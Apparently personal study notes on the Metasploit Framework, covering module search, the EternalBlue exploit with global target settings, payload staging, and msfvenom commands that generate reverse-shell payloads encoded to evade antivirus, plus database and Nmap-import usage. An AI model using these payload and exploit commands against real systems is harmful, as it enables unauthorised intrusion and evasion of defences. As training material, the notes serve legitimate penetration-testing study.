#### MSF - Specific Search

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
- `info` : select a module  and then use info command to get more info on that module.

#### MSF - Permanent Target Specification

- basically just add a `g` at the end.. setg lhost... setg rhosts and so on.
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```

## Payloads
- Refers to a module that aids the exploit module in (typically) returning a shell to the attacker.
- Three different types of payload modules in the Metasploit Framework: `Singles, Stagers, and Stages`
- Whether or not a payload is staged is represented by `/` in the payload name.
- For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).
- `Singles` are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running.
- `Stagers` are used to establish the network connection between our attack host and the target victim.small and reliable.
- `Stages` are payload components that are downloaded by stager's modules.The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:

	- A single `recv()` fails with large payloads
	- The Stager receives the middle stager
	- The middle Stager then performs a full download
	- Also better for RWX

#### MSF - Searching for Specific Payload

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```shell-session
grep meterpreter grep reverse_tcp show payloads
```


## Meterpreter native search

```
search -f flag.txt
```

## Encoders
- Used to make payloads compatible with different processors as well as for AV evasion.
- If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward.
```shell-session
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
- But the above method is  obsolete since msfvenom can now handle payload generation and encoding.

#### Generating Payload - Without Encoding

```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

#### Generating Payload - With Encoding

```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

- we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

- If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today.
- Even if we try multiple iterations, it would probably be detected by modern AV's.

## Databases
- metasploit  has built-in support for postgreSQL.
```shell-session
sudo systemctl start postgresql
msfdb init
```

#### MSF - Connect to the Initiated Database

```shell-session
sudo msfdb run
```


### workspaces

- create separate work spaces for different targets.
```shell-session
 workspace -a Target_1
```

## Importing Scan Results

let us assume we want to import a `Nmap scan` of a host into our Database's Workspace to understand the target better.

```bash
msf6 > db_import Target.xml
```

![[Pasted image 20260126135942.png]]

## Using Nmap Inside MSFconsole

```shell-session
db_nmap -sV -sS 10.10.10.8
```

## Data Backup

- `db_export` command can be used to backup our data if anything happens to the postgreSQL service
```bash
db_export -f xml backup.xml
```

## Plugins
- Plugins directory : `/usr/share/metasploit-framework/plugins`
- 
